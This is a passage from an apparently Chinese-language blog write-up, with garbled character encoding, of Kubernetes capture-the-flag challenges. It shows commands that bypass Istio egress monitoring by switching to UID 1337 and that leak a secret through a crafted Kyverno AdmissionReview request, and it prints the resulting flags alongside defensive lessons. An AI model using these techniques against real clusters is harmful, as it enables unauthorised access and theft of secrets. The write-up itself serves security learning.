</span></span><span style=display:flex><span>RBAC: access denied
</span></span></code></pre></div><ol start=3><li>æ ¹æ®<a href=https://github.com/istio/istio/issues/4286>issues</a>ä»¥åŠ<a href=https://istio.io/v1.11/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf>Istio Security Assessment</a>ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ›å»º UID 1337 çš„ç”¨æˆ·å¹¶ä»¥è¯¥ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œä»è€Œç»•è¿‡ Envoy å¯¹å‡ºç«™æµé‡çš„ç›‘æ§ã€‚</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cat /etc/passwd |grep 1337</span>
</span></span><span style=display:flex><span>istio:x:1337:1337::/home/istio:/bin/sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># su istio</span>
</span></span><span style=display:flex><span>$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1337<span style=color:#f92672>(</span>istio<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>only-leet-hex0rs-can-play-both-k8s-and-linux<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=æ€è€ƒ-3>æ€è€ƒ<a href=#æ€è€ƒ-3 class=hanchor arialabel=Anchor>#</a></h3><p>å®¹å™¨å†…é¿å…ä½¿ç”¨rootç”¨æˆ·è¿è¡Œã€‚</p><h2 id=challenge-5-lateral-movement>Challenge 5: LATERAL MOVEMENT<a href=#challenge-5-lateral-movement class=hanchor arialabel=Anchor>#</a></h2><h3 id=é¢˜ç›®-4>é¢˜ç›®<a href=#é¢˜ç›®-4 class=hanchor arialabel=Anchor>#</a></h3><p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a href=https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request>administrative</a> services.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>kyverno.io/v1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Policy</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>apply-flag-to-env</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>sensitive-ns</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>rules</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>inject-env-vars</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>match</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>resources</span>:
</span></span><span style=display:flex><span>          <span style=color:#f92672>kinds</span>:
</span></span><span style=display:flex><span>            - <span style=color:#ae81ff>Pod</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>mutate</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>patchStrategicMerge</span>:
</span></span><span style=display:flex><span>          <span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>            <span style=color:#f92672>containers</span>:
</span></span><span style=display:flex><span>              - <span style=color:#f92672>name</span>: <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>env</span>:
</span></span><span style=display:flex><span>                  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>FLAG</span>
</span></span><span style=display:flex><span>                    <span style=color:#f92672>value</span>: <span style=color:#e6db74>&#34;{flag}&#34;</span>
</span></span></code></pre></div><h3 id=è§£é¢˜-4>è§£é¢˜<a href=#è§£é¢˜-4 class=hanchor arialabel=Anchor>#</a></h3><ol><li>æ‰«æ</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ dnscan -subnet 10.100.0.1/16
</span></span><span style=display:flex><span>10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
</span></span><span style=display:flex><span>10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local.
</span></span></code></pre></div><ol start=2><li>æ ¹æ®[administrative](<a href=https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request]>https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request]</a>ï¼Œè¿›è¡ŒAdmissionReview</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> --data <span style=color:#e6db74>&#39;{&#34;apiVersion&#34;:&#34;admission.k8s.io/v1&#34;,&#34;kind&#34;:&#34;AdmissionReview&#34;,&#34;request&#34;:{&#34;uid&#34;:&#34;12345678-1234-1234-1234-123456789012&#34;,&#34;kind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;resource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;requestKind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;requestResource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;namespace&#34;:&#34;sensitive-ns&#34;,&#34;operation&#34;:&#34;CREATE&#34;,&#34;object&#34;:{&#34;apiVersion&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;,&#34;metadata&#34;:{&#34;name&#34;:&#34;example-pod&#34;,&#34;namespace&#34;:&#34;sensitive-ns&#34;},&#34;spec&#34;:{&#34;containers&#34;:[{&#34;name&#34;:&#34;example-container&#34;,&#34;image&#34;:&#34;nginx&#34;,&#34;env&#34;:[{&#34;name&#34;:&#34;FLAG&#34;,&#34;value&#34;:&#34;{flag}&#34;}]}]}}}}&#39;</span> | jq -r .response.patch | base64 -d | jq -r <span style=color:#e6db74>&#39;.[0].value&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=æ€è€ƒ-4>æ€è€ƒ<a href=#æ€è€ƒ-4 class=hanchor arialabel=Anchor>#</a></h3><p>é¿å…åœ¨åŠ¨æ€å‡†å…¥æ§åˆ¶æ”¾ç½®æ•æ„Ÿä¿¡æ¯ã€‚</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2024 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>